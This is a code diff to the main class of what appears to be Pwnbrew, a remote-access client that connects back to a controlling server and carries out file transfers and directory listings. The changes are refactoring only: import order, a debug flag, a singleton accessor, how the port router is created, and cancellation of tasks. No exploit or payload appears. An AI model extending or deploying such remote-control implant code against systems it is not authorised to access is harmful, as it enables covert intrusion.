@@ -49,9 +49,9 @@ import java.util.List;
 import java.util.logging.Level;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
-import pwnbrew.manager.PortManager;
 import pwnbrew.manager.DataManager;
 import pwnbrew.manager.OutgoingConnectionManager;
+import pwnbrew.manager.PortManager;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.DebugPrinter;
 import pwnbrew.utilities.ReconnectTimer;
@@ -75,9 +75,10 @@ import pwnbrew.utilities.Utilities.ManifestProperties;
 public final class Pwnbrew extends PortManager implements TaskListener {
 
     private static final String NAME_Class = Pwnbrew.class.getSimpleName();
-    private static final boolean debug = false;
-  
-     
+    private static final boolean debug = true;
+    
+    private static Pwnbrew thePwnbrewInstance;
+
     //===============================================================
     /**
      *  Constructor
@@ -113,6 +114,15 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         initialize();
 
     }
+    
+    //=========================================================================
+    /**
+     * 
+     * @return 
+     */
+    public static Pwnbrew getPwnbrewInstance() {
+        return thePwnbrewInstance;
+    }
 
     
     //===============================================================
@@ -123,9 +133,13 @@ public final class Pwnbrew extends PortManager implements TaskListener {
     private void start() throws UnknownHostException, LoggableException {
         
         //Try and connect to the server
-        int thePort = ClientConfig.getConfig().getSocketPort();
-        getPortRouter( thePort );
-        
+        int thePort = ClientConfig.getConfig().getSocketPort();     
+        try {
+            DataManager.createPortRouter(this, thePort, true);
+        } catch (IOException ex) {
+            throw new RuntimeException("Unable to create port router on port: " + Integer.toString(thePort));
+        }
+                
         //Create the Timer
         ReconnectTimer aReconnectTimer = new ReconnectTimer(OutgoingConnectionManager.COMM_CHANNEL_ID); 
         
@@ -256,8 +270,8 @@ public final class Pwnbrew extends PortManager implements TaskListener {
             if( argList.size() > 0 ){
                
                 //Instantiate the manager and start it up
-                Pwnbrew entryPoint = new Pwnbrew( argList );
-                entryPoint.start();
+                thePwnbrewInstance = new Pwnbrew( argList );
+                thePwnbrewInstance.start();
 
                 return;
             
@@ -291,20 +305,11 @@ public final class Pwnbrew extends PortManager implements TaskListener {
 
         String taskStatus = passedMsg.getStatus();
         if (taskStatus.equals( TaskStatus.TASK_CANCELLED)){
-            
-            //Get the file manager
-            try {
-                
-                FileMessageManager theFileMM = FileMessageManager.getFileMessageManager();
-                if( theFileMM == null ){
-                    theFileMM = FileMessageManager.initialize( this );
-                } 
-                theFileMM.cancelFileTransfer( taskId ); 
-                
-            } catch( IOException | LoggableException ex){
-                RemoteLog.log(Level.WARNING, NAME_Class, "taskChanged()", ex.getMessage(), ex);
-            }
-            
+            //Cancel any file transfers
+            FileMessageManager theFileMM = FileMessageManager.getFileMessageManager();
+            theFileMM.cancelFileTransfer( taskId );
+            //Cancel any dir listing
+            theFileMM.cancelDirListing( taskId, passedMsg.getChannelId() );
         }
 
     }
@@ -324,7 +329,7 @@ public final class Pwnbrew extends PortManager implements TaskListener {
      * Returns the Comm Manager
      * @return 
     */
-    public PortManager getCommManager() {
+    public Pwnbrew getCommManager() {
         return this;
     }
     
